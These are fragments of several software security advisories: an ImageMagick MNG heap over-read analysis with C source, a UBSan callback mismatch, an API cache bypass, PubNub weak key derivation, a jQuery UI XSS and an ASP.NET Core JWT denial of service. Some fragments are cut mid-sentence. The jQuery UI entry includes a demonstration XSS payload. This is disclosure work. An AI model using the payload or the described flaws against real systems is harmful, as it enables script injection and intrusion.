heap-buffer overflow read in MNG magnification with alpha","details":"## **Vulnerability Details**\n\nWhen performing image magnification in `ReadOneMNGIMage` (in `coders/png.c`), there is an issue around the handling of images with separate alpha channels.\n\nWhen loading an image with a color type that implies a separate alpha channel (ie. `jng_color_type >= 12`), we will load the alpha pixels in this loop:\n\n```c\n     if (logging != MagickFalse)\n        (void) LogMagickEvent(CoderEvent,GetMagickModule(),\n          \"    Reading alpha from alpha_blob.\");\n      jng_image=ReadImage(alpha_image_info,exception);\n\n      if (jng_image != (Image *) NULL)\n        for (y=0; y < (ssize_t) image->rows; y++)\n        {\n          s=GetVirtualPixels(jng_image,0,y,image->columns,1,exception);\n          q=GetAuthenticPixels(image,0,y,image->columns,1,exception); // [0]\n          if ((s == (const Quantum *)  NULL) || (q == (Quantum *) NULL))\n            break;\n\n          if (image->alpha_trait != UndefinedPixelTrait)\n            for (x=(ssize_t) image->columns; x != 0; x--)\n            {\n              SetPixelAlpha(image,GetPixelRed(jng_image,s),q);\n              q+=(ptrdiff_t) GetPixelChannels(image);\n              s+=(ptrdiff_t) GetPixelChannels(jng_image);\n            }\n\n          else\n            for (x=(ssize_t) image->columns; x != 0; x--)\n            {\n              Quantum\n                alpha;\n\n              alpha=GetPixelRed(jng_image,s);\n              SetPixelAlpha(image,alpha,q);\n              if (alpha != OpaqueAlpha)\n                image->alpha_trait=BlendPixelTrait; // [1]\n              q+=(ptrdiff_t) GetPixelChannels(image);\n              s+=(ptrdiff_t) GetPixelChannels(jng_image);\n            }\n\n          if (SyncAuthenticPixels(image,exception) == MagickFalse)\n            break;\n        }\n```\n\nNote that at \\[1\\] we update `image->alpha_trait`, but if our alpha image only contains non-opaque pixels in the last row, we do not call `GetAuthenticPixels` (at \\[0\\]) after this change has been made. \n\nThe next call to `GetAuthenticPixels` will then call down into `ResetPixelChannelMap` which adds the new alpha channel to the image channel mappings and metadata.\n\nIf we then pass this image into the `MAGN` chunk type, we can see that at \\[2\\] we calculate the sizes for intermediate buffers `next` and `prev`, before calling `GetAuthenticPixels` at \\[4\\]. \n\nAfter the call at \\[4\\], the `image->num_channels` has increased to include the new alpha channel, and now `length` and the previously allocated `next` and `prev` buffers are too small. Fortunately `length` is always used when copying into the buffers, but when reading pixels from the buffers, we call `GetPixelXXX` which assumes the layout of the current image, which requires a larger allocation. \n\nThe pixel copying loop will subsequently read beyond the end of the allocation at \\[5\\].\n\n```c\n               /* magnify the rows into the right side of the large image

ConstantString has a different signature (`char *ConstantString(const char *)`). Calling through the mismatched function type is undefined behavior in C and triggers UBSan’s function-type-mismatch.\nThe path is exercised during coalescing: CloneImage → CloneImageProfiles → CloneSplayTree.\nScope\nReproduces with a minimal, sanitizer-instrumented, PNG-enabled build and delegates disabled (policy.xml), suggesting the issue is in MagickCore rather than external delegates.\nSuggested fix (sketch)\nUse a wrapper that matches the expected callback prototype, or adjust the splay-tree callback typedef for const-correctness. For example:\nstatic void *CloneStringShim(const void *p) {\nreturn (void *) ConstantString((const char *) p);\n}\n\n/* When setting splay-tree clone_value, use CloneStringShim instead of ConstantString. */\n\nAlternatively, update the clone callback typedefs to use const void* consistently (and return void*) and ensure callers pass a correctly typed wrapper.\n\nArtifacts\nMinimised

As such it's possible for a user without a valid API key to retrieve a response for a given path and query if it has recently been requested and cached by request with a valid key.\n\n### Patches\nPatches will be available in 13.9.3, 15.4.4 and 16.1.1.\n\n### Workarounds\nWorkaround is to remove or reduce the time period of the output caching or to provide other restrictions to access the delivery API such as by IP.\n\n### References\nContent delivery API documentation:

Insufficient Entropy vulnerability","details":"Versions of the package pubnub before 7.4.0; all versions of the package com.pubnub:pubnub; versions of the package pubnub before 6.19.0; all versions of

7.7.0; versions of the package pubnub/swift before 6.2.0; versions of the package pubnub before 5.2.0; versions of the package pubnub before 4.3.0 are vulnerable to Insufficient Entropy via the getKey function, due to inefficient implementation of the AES-256-CBC cryptographic algorithm. The provided encrypt function is less secure when hex encoding and trimming are applied, leaving half of the bits in the key always the same for every encoded message or file.\n\n**Note:**\n\nIn order to exploit this vulnerability, the attacker needs to invest resources in preparing the attack and brute-force the

UI vulnerable to XSS when refreshing a checkboxradio with an HTML-like initial text label","details":"### Impact\nInitializing a checkboxradio widget on an input enclosed within a label makes that parent label contents considered as the input label. If you call `.checkboxradio( \"refresh\" )` on such a widget and the initial HTML contained encoded HTML entities, they will erroneously get decoded. This can lead to potentially executing JavaScript code.\n\nFor example, starting with the following initial secure HTML:\n```html\n<label>\n\t<input id=\"test-input\">\n\t&lt;img src=x onerror=\"alert(1)\"&gt;\n</label>\n```\nand calling:\n```js\n$( \"#test-input\" ).checkboxradio();\n$( \"#test-input\" ).checkboxradio( \"refresh\" );\n```\nwill turn the initial HTML into:\n```html\n<label>\n\t<!-- some jQuery UI elements -->\n\t<input id=\"test-input\">\n\t<img src=x onerror=\"alert(1)\">\n</label>\n```\nand the alert will get executed.\n\n### Patches\nThe bug has been patched in jQuery UI 1.13.2.\n\n### Workarounds\nTo remediate the issue, if you can change the initial HTML, you can wrap all the non-input contents of the `label` in a `span`:\n```html\n<label>\n\t<input id=\"test-input\">\n\t<span>&lt;img src=x onerror=\"alert(1)\"&gt;</span>\n</label>\n```\n\n### References\nhttps://blog.jqueryui.com/2022/07/jquery-ui-1-13-2-released/\n\n### For more information\nIf you have any questions or comments about this advisory, search for a relevant issue in [the jQuery UI repo](https://github.com/jquery/jquery-ui/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc).

ASP.NET Core project templates vulnerable to denial of service","details":"A Denial of Service vulnerability exists in ASP.NET Core project templates which utilize JWT-based authentication tokens. This vulnerability allows an unauthenticated client to consume arbitrarily large amounts of server memory, potentially triggering an out-of-memory condition on the server and making the server no longer able to respond to legitimate requests. \n\n## Announcement\n\nAnnouncement for this issue can be found at  https://github.com/dotnet/announcements/issues/290\n\n### Mitigation factors\n\nThis impacts only .NET Core-based projects that were created using any version of project templates listed in affected software. \nOther project templates e.g., console applications, MAUI applications, Windows Forms or WPF applications, are not affected.\n\n## Affected software\n\nThis impacts only .NET Core-based projects that were created using any version of the below project templates.\n\n-\tASP.NET Core Web App (Model-View-Controller)\n-\tASP.NET Core Web API\n-\tASP.NET Core Web App (Razor Pages)\n-\tBlazor Server App\n-\tBlazor WebAssembly App\n\n## Advisory FAQ\n\n### How do I know if I am affected?\n\nIf you are you using project templates listed in affected software, you may be exposed to the vulnerability.\n\n### How do I fix the issue?\n\n#### For existing projects:\nIf you ever created any of these projects via the dotnet new command or via Visual Studio's File -> New Project gesture, and if you enabled federated authentication at project creation time, your project may be vulnerable. To remediate the vulnerability, use your package manager to update any references you may have to the Microsoft.AspNetCore.Authentication.JwtBearer, Microsoft.AspNetCore.Authentication.OpenIdConnect, and Microsoft.IdentityModel.JsonWebTokens packages to their respective latest versions. \n- [Microsoft.AspNetCore.Authentication.JwtBearer](https://www.nuget.org/packages/Microsoft.AspNetCore.Authentication.JwtBearer/) \n- [Microsoft.AspNetCore.Authentication.OpenIdConnect](https://www.nuget.org/packages/Microsoft.AspNetCore.Authentication.OpenIdConnect/) \n\nIf your project does not reference any of those three packages, you are not exposed to this vulnerability.\n\n#### For new projects:\nTo remediate this issue please update to the latest SDK listed below. Simply installing the SDK update is not sufficient to remediate projects already-created / already-deployed projects which existed prior to this update being released.\n\n* To fix the issue please install the latest version of .NET 6.0 or .NET 7.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you are using one of the affected packages, please update to the patched version listed above.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n Version:   7.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\7.0.300\\\n\nHost (useful for support):\n\n  Version: 76.0.5\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  7.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspNetCore.App 7.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.NETCore.App 7.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App]\n  Microsoft.WindowsDesktop.App 7.0.5 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.101 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n* If you're using .NET 7.0, you should download and install .NET SDK 7.0.115 (for Visual Studio 2022 v17.4) from https://dotnet.microsoft.com/download/dotnet-core/7.0.\n* If you're using .NET 6.0, you should download and install .NET SDK 6.0.321 (for Visual Studio 2022 v17.2) from https://dotnet.microsoft.com/download/dotnet-core/6.0.\n\n.NET 6.0, .NET 7.0, .NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 7.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization.
